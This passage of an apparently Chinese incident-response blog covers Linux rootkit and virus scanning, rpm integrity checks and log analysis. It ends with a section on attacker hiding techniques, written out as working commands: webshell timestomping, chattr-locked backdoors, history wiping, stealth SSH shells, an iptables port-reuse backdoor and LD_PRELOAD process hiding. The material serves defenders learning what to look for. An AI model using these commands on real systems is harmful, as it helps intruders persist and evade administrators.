https:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;rkhunter&#x2F;rkhunter&#x2F;1.4.4&#x2F;rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>安装方式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;libpng&#x2F;zlib&#x2F;1.2.7&#x2F;zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS&#x3D;&quot;-O3 -fPIC&quot; .&#x2F;configure --prefix&#x3D; &#x2F;usr&#x2F;local&#x2F;zlib&#x2F;</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s &#x2F;bin&#x2F;false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;opt&#x2F;clamav --disable-clamav -with-zlib&#x3D;&#x2F;usr&#x2F;local&#x2F;zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;updata</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;freshclam.log</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;clamd.log</span><br><span class="line">cd &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> &#x2F;opt&#x2F;clamav&#x2F;bin&#x2F;freshclam 升级病毒库</span><br><span class="line">.&#x2F;clamscan –h 查看相应的帮助信息</span><br><span class="line">.&#x2F;clamscan -r &#x2F;home  扫描所有用户的主目录就使用</span><br><span class="line">.&#x2F;clamscan -r --bell -i &#x2F;bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r &#x2F;etc --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;etcclamav.log</span><br><span class="line">clamscan -r &#x2F;bin --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;binclamav.log</span><br><span class="line">clamscan -r &#x2F;usr --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;bsd-port</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">clamscan -r --remove  &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat &#x2F;root&#x2F;usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>linux版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http:&#x2F;&#x2F;www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F;backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h4><p> 系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">        S         文件大小是否改变</span><br><span class="line">        M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">        5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">        D         设备中，从代码是否改变</span><br><span class="line">        L         文件路径是否改变</span><br><span class="line">        U         文件的属主（所有者）是否改变</span><br><span class="line">        G         文件的属组是否改变</span><br><span class="line">        T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf &#x2F;bin&#x2F;ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  &#x2F;bin&#x2F;ls &#x2F;tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Packages&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls 提取rpm包中ls命令到当前目录的&#x2F;bin&#x2F;ls下</span><br><span class="line">cp &#x2F;root&#x2F;bin&#x2F;ls  &#x2F;bin&#x2F; 把ls命令复制到&#x2F;bin&#x2F;目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h4><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p><h1 id="Linux-日志分析"><a href="#Linux-日志分析" class="headerlink" title="Linux 日志分析"></a>Linux 日志分析</h1><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志： 登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 登录日志记录：/var/log/secure</p><p> 目前登录用户信息：/var/run/utmp //w、who、users</p><p> 历史命令记录：history 仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">标准unix&#x2F;linux下的grep通过下面參数控制上下文：</span><br><span class="line">grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">grep -B 5 foo file 显示foo及前5行</span><br><span class="line">grep -A 5 foo file 显示foo及后5行</span><br><span class="line">查看grep版本号的方法是</span><br><span class="line">grep -V</span><br></pre></td></tr></table></figure><p>2、grep 查找含有某字符串的所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure><p>3、如何显示一个文件的某几行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure><p>4、find /etc -name init</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在目录&#x2F;etc中查找文件init</span><br></pre></td></tr></table></figure><p>5、只是显示/etc/passwd的账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat &#x2F;etc&#x2F;passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;&#96;  </span><br><span class="line">&#x2F;&#x2F;awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。</span><br></pre></td></tr></table></figure><p>6、sed -i ‘153,$d’ .bash_history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除历史操作记录，只保留前153行</span><br></pre></td></tr></table></figure><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><p>~~~yum install gcc yum install gcc</p><p>[root@bogon ~]# more /var/log/yum.log</p><p>Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 <del>~</del></p><h1 id="Linux-权限维持"><a href="#Linux-权限维持" class="headerlink" title="Linux 权限维持"></a>Linux 权限维持</h1><h2 id="隐藏篇"><a href="#隐藏篇" class="headerlink" title="隐藏篇"></a>隐藏篇</h2><h3 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch .test.txt</code></p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png"></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 锁定文件</span><br><span class="line">lsattr  evil.php   属性查看</span><br><span class="line">chattr -i evil.php 解除锁定</span><br><span class="line">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><p>不会吧。不会真有人挂科吧。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><h3 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png"></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;150,$d&#39; .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h3><p><strong>隐身登录系统，不会被w、who、last等指令检测到.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i</span><br></pre></td></tr></table></figure><h3 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h3><p>端口复用参考：<a href="https://zhuanlan.zhihu.com/p/78857088">https://zhuanlan.zhihu.com/p/78857088</a></p><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#安装SSLH</span><br><span class="line"> sudo apt-get install sslh</span><br><span class="line"> #配置SSLH</span><br><span class="line"> 编辑 SSLH 配置文件：</span><br><span class="line"> sudo vi &#x2F;etc&#x2F;default&#x2F;sslh</span><br><span class="line"> 1、找到下列行：Run&#x3D;no  将其修改为：Run&#x3D;yes</span><br><span class="line"> 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line"> DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;</span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 端口复用链</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># 端口复用规则</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># 开启开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># 关闭开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#39;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启复用</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#ssh使用80端口进行登录</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#关闭复用</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png"></p><p>具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gianlucaborello&#x2F;libprocesshider.git</span><br><span class="line">cd libprocesshider&#x2F; &amp;&amp; make</span><br><span class="line"># 移动文件到&#x2F;usr&#x2F;local&#x2F;lib&#x2F;目录下</span><br><span class="line">cp libprocesshider.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so &gt;&gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png"></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># 使用</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img 